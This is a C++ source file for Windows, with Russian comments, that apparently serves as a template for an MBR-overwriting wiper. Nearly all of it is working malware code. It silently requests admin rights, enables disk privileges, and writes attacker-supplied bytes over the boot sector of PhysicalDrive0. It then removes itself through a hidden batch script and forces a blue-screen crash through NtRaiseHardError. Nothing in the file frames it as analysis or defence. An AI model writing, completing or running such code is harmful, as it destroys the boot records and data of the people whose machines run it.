#include <windows.h>
#include <string>
#include <vector>
#include <fstream>

const char MBR_HEX[] = "{MBR_DATA}";

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

// === ВЫЗОВ BSOD ===
typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    HARDERROR_RESPONSE_OPTION ResponseOption,
    PHARDERROR_RESPONSE Response
);

void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!NtRaiseHardError) return;
    
    ULONG_PTR params[4] = {0};
    HARDERROR_RESPONSE response;
    
    NtRaiseHardError(
        0xC000021A,
        1,
        0,
        (PULONG_PTR)&params,
        OptionShutdownSystem,
        &response
    );
}

// === ПОВЫШЕНИЕ ПРАВ ===
void ElevateAndRun() {
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = GetCommandLineA();
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
    }
}

// === КОНВЕРТЕР HEX ===
std::vector<unsigned char> HexToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// === ЗАПИСЬ MBR (СКРЫТО) ===
void WriteMBR() {
    std::string hex(MBR_HEX);
    std::vector<unsigned char> mbr = HexToBytes(hex);
    
    if (mbr.size() != 512) return;
    
    // Отключаем проверки целостности Windows
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &tkp.Privileges[0].Luid);
    LookupPrivilegeValueA(NULL, SE_RESTORE_NAME, &tkp.Privileges[1].Luid);
    LookupPrivilegeValueA(NULL, SE_SECURITY_NAME, &tkp.Privileges[2].Luid);
    tkp.PrivilegeCount = 3;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tkp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
    tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    
    // Открываем диск
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        hDisk = CreateFileA(
            "\\\\.\\PhysicalDrive0",
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) return;
    }
    
    // Записываем MBR
    DWORD bytesWritten;
    WriteFile(hDisk, mbr.data(), 512, &bytesWritten, NULL);
    CloseHandle(hDisk);
    
    // Самоуничтожение
    wchar_t szPath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    std::wstring batPath = std::wstring(szPath) + L".bat";
    std::ofstream bat(batPath);
    bat << "@echo off\n";
    bat << "timeout /t 1 /nobreak > nul\n";
    bat << "del \"" << szPath << "\"\n";
    bat << "del \"" << batPath << "\"\n";
    bat.close();
    
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessW(NULL, (LPWSTR)batPath.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // BSOD
    HRSRC hRes = FindResourceA(NULL, "BSOD", "SETTING");
    if (hRes) {
        TriggerBSOD();
    }
}

// === ТОЧКА ВХОДА ===
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    // Если не админ — запрашиваем права
    if (!IsUserAnAdmin()) {
        ElevateAndRun();
        return 0;
    }
    
    // Скрываем окно консоли
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WriteMBR();
    
    return 0;
}
